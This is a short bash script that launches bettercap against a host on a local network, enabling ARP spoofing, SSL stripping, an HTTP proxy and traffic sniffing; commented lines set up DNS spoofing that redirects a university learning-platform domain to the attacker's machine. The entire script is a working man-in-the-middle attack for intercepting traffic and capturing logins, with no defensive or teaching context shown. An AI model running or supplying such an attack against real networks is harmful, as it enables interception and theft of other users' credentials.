#!/bin/bash
self=$(hostname -I | cut -c1-13)
echo "$self ambientevirtul.nce.ufrj.br " > ./hosts.dns

#arpspoof -i eth0 -t $host -r 192.168.0.1
alvos=192.168.0.44

#bettercap -eval "set arp.soof.targets $alvos; arp.spoof on;set dns.spoof.domains ambientevirtual.nce.ufrj.br;set dns.spoof.address $self;set dns.spoof.targets $alvos;dns.spoof on;'"

bettercap -iface eth0 -eval "set http.proxy.sslstrip true;set arp.spoof.targets $alvos; arp.spoof on; http.proxy on;net.sniff on;"
